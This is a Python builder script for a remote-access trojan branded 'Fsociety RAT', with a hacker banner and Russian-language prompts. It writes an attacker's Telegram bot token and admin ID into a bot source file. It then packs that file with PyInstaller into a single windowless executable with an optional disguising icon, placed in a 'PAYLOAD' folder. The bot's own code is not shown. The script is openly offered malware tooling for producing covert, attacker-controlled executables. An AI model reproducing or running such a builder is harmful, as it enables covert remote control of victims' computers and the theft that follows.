import os
import shutil
import re
import time
import subprocess
import sys

def loading():
    for _ in range(3):
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
            """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)

def FSOCIETY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ______                _      __            ____  ___  ______
   / ____/________  _____(_)__  / /___  __    / __ \/   |/_  __/
  / /_  / ___/ __ \/ ___/ / _ \/ __/ / / /   / /_/ / /| | / /   
 / __/ (__  ) /_/ / /__/ /  __/ /_/ /_/ /   / _, _/ ___ |/ /    
/_/   /____/\____/\___/_/\___/\__/\__, /   /_/ |_/_/  |_/_/     
                                 /____/                                                                                        

[*] The world is a dangerous place not because of those who do evil but because of those who look on and do nothing

[+] Version | v1.0
[+] Author  | necouncil
[*] Github  | https://github.com/necouncil
[*] TikTok  | https://www.tiktok.com/@societycontroled
""")

def set(token, uid):
    with open("bot_source.py", "r", encoding="utf-8") as f:
        src = f.read()

    src = re.sub(r'TELEGRAM_BOT_TOKEN\s*=\s*[\'"][^\'"]*[\'"]', 
                f'TELEGRAM_BOT_TOKEN = "{token}"', src)
    
    src = re.sub(r'ADMIN_USER_ID\s*=\s*[^\n]+', 
                f'ADMIN_USER_ID = {uid}', src)

    if not os.path.exists("lib"):
        os.makedirs("lib")
    
    with open("lib/bot.py", "w", encoding="utf-8") as f:
        f.write(src)

    print("[+] Конфигурация сохранена")

def build(exe, icon):
    try:
        subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
    except:
        print("[!] PyInstaller не установлен. Установите: pip install pyinstaller")
        return

    if not os.path.exists("lib/bot.py"):
        print("[!] Файл lib/bot.py не найден")
        return

    if not os.path.exists("PAYLOAD"):
        os.makedirs("PAYLOAD")

    cmd = [
        'pyinstaller',
        '--onefile',
        '--clean',
        '--name', exe,
        '--noconsole',
        '--distpath', 'PAYLOAD',
        'lib/bot.py'
    ]

    if icon and icon.strip() and os.path.exists(icon.strip()):
        cmd.insert(-1, '--icon')
        cmd.insert(-1, icon.strip())
        print(f"[+] Используется иконка: {icon.strip()}")
    else:
        print("[i] Иконка не указана или не найдена")

    print(f"[+] Сборка {exe}.exe...")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n[!] Сборка завершена!")
            print(f"[+] Файл: PAYLOAD/{exe}.exe")

            for item in ['build', f'{exe}.spec']:
                if os.path.exists(item):
                    if os.path.isdir(item):
                        shutil.rmtree(item)
                    else:
                        os.remove(item)
            
            exe_path = os.path.join("PAYLOAD", f"{exe}.exe")
            if os.path.exists(exe_path):
                size = os.path.getsize(exe_path) / (1024 * 1024)
                print(f"[+] Размер файла: {size:.2f} MB")
        else:
            print(f"[!] Ошибка сборки:")
            print(result.stderr)
            
    except Exception as e:
        print(f"[!] Ошибка: {e}")

if __name__ == "__main__":
    try:
        loading()
        FSOCIETY()

        if not os.path.exists("bot_source.py"):
            print("[!] Файл bot_source.py не найден!")
            print("[i] Создайте файл bot_source.py с кодом Telegram бота")
            sys.exit(1)

        token = input("""
┌──(root@FSOCIETY)-[~]
└─# Введите токен Telegram бота
                 
┌──(root@FSOCIETY)-[~]
└─# """).strip()
        
        uid = input("""
┌──(root@FSOCIETY)-[~]
└─# Введите ваш Telegram ID (цифры)
                 
┌──(root@FSOCIETY)-[~]
└─# """).strip()
        
        exe = input("""
┌──(root@FSOCIETY)-[~]
└─# Введите имя EXE файла (без .exe)
                 
┌──(root@FSOCIETY)-[~]
└─# """).strip() or "client"
        
        icon = input("""
┌──(root@FSOCIETY)-[~]
└─# Путь к иконке .ico (Enter чтобы пропустить)
                 
┌──(root@FSOCIETY)-[~]
└─# """).strip()

        print(f"\n[+] Токен: {token[:10]}...")
        print(f"[+] ID: {uid}")
        print(f"[+] Имя файла: {exe}.exe")
        if icon:
            print(f"[+] Иконка: {icon}")

        confirm = input("\n[?] Продолжить? (y/n): ").lower()
        if confirm != 'y':
            print("[i] Отменено")
            sys.exit(0)

        set(token, uid)
        build(exe, icon)

    except KeyboardInterrupt:
        print("\n[i] Отменено пользователем")
    except Exception as e:
        print(f"[!] Критическая ошибка: {e}")

